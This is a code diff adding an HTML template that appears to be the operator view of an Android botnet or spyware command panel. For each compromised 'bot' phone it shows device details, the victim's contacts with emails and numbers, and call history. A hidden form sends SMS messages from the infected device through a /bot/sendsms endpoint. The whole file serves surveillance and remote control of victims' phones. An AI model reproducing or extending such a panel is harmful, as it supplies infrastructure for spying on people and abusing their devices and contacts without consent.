@@ -1,0 +1,109 @@
+<!-- Hidden Download Form -->
+<div id="sendSmsModal" class="modal hide fade" style="display: none; ">
+    <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal">×</button>
+        <h3>Send SMS Message</h3>
+    </div>
+    <div class="modal-body">
+        <h4>SMS Options</h4>
+        <form id="sms-options" method="post" action="/bot/sendsms">
+        	<input type="hidden" id="sms-contact" name="format" value="" />
+        	<br />
+        	SMS Body<br />
+			<input type="text" name="sms-text" placeholder="SMS Text Message" />
+		</form>
+    </div>
+    <div class="modal-footer">
+        <a href="#" class="btn" data-dismiss="modal">Close</a>
+        <button type="button" class="btn btn-primary" onclick="document.forms['sms-options'].submit();">Send Message</button>
+    </div>
+</div>
+
+<!-- Start Visable -->
+<div id="inner-details" class="animated fadeIn">
+	<h2>Phone Details</h2>
+	<div class="well">
+		<table class="table table-striped">
+	        <thead>
+	          <tr>
+	            <th>#</th>
+	            <th>Model</th>
+	            <th>Release Version</th>
+	            <th>Codename</th>
+	            <th>Kernel Version</th>
+	            <th>Build Version</th>
+	            <th>API</th>
+	            <th>Device</th>
+	            <th>Product</th>
+	          </tr>
+	        </thead>
+	        <tbody>
+			    <tr>
+			        <td>{{ bot.id }}</td>
+			        <td>{{ bot.model }}</td>
+			        <td>{{ bot.release_version }}</td>
+			        <td>{{ bot.codename }}</td>
+			        <td>{{ bot.os_version }}</td>
+			        <td>{{ bot.build_version }}</td>
+			        <td>{{ bot.sdk_version }}</td>
+			        <td>{{ bot.device }}</td>
+			        <td>{{ bot.product }}</td>
+			    </tr>
+	        </tbody>
+	    </table>
+	</div>
+
+	<h2>Contacts</h2>
+	<div class="well">
+		<table class="table table-striped">
+	        <thead>
+	          <tr>
+	            <th>#</th>
+	            <th>Name</th>
+	            <th>Phone Number</th>
+	            <th>Email</th>
+	            <th>Commands</th>
+	        </thead>
+	        <tbody>
+	        	{% for contact in bot.contacts %}
+			          <tr>
+			            <td>{{ contact.id }}</td>
+			            <td>{{ contact.name }}</td>
+			            <td>{{ contact.phone_number }}</td>
+			            <td>{{ contact.email }}</td>
+			            <td>
+			            	<a class="btn btn-primary" data-toggle="modal" href="#sendSmsModal" onclick="set_contact({{ contact.id }})">
+			            		Send SMS
+			            	</a>
+			            </td>
+			          </tr>
+			    {% end %}
+	        </tbody>
+	    </table>
+	</div>
+
+	<h2>Call History</h2>
+	<div class="well">
+		<table class="table table-striped">
+	        <thead>
+	          <tr>
+	            <th>#</th>
+	            <th>Name</th>
+	            <th>Phone Number</th>
+	            <th>Contact Name</th>
+	            <th>Number Type</th>
+	        </thead>
+	        <tbody>
+	        	{% for call in bot.call_history %}
+			          <tr>
+			            <td>{{ call.id }}</td>
+			            <td>{{ call.call_type }}</td>
+			            <td>{{ call.phone_number }}</td>
+			            <td>{{ call.contact_name }}</td>
+			        	<td>{{ call.number_type }}</td>
+			          </tr>
+			    {% end %}
+	        </tbody>
+	    </table>
+	</div>
+</div>
